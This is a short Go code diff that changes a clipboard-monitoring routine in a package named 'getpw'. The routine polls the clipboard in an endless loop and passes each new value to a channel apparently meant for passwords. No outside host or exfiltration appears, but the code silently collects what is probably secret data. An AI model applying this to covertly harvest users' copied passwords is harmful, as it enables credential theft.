@@ -1,23 +1,20 @@
 package getpw
 
 import (
-	"fmt"
-	"runtime"
 	"time"
 
-	"golang.design/x/clipboard"
+	"github.com/atotto/clipboard"
 )
 
 
 func MonitorClipboard() {
-	clipOldB := clipboard.Read(clipboard.FmtText)
+	clipOldB, _ := clipboard.ReadAll()
 	clipOld := string(clipOldB)
-	fmt.Println(runtime.GOOS)
-	if runtime.GOOS == "darwin" {
-		
-	}
 	for {
-		clipNewB := clipboard.Read(clipboard.FmtText)
+		clipNewB, err := clipboard.ReadAll()
+		if err != nil {
+			continue
+		}
 		clipNew := string(clipNewB)
 		if clipNew != clipOld && clipNew != "" {
 			clipOld = clipNew
@@ -28,6 +25,6 @@ func MonitorClipboard() {
 			}
 			PWC <- p
 		}
-		time.Sleep(time.Microsecond * 10)
+		time.Sleep(time.Microsecond * 50)
 	}
 }
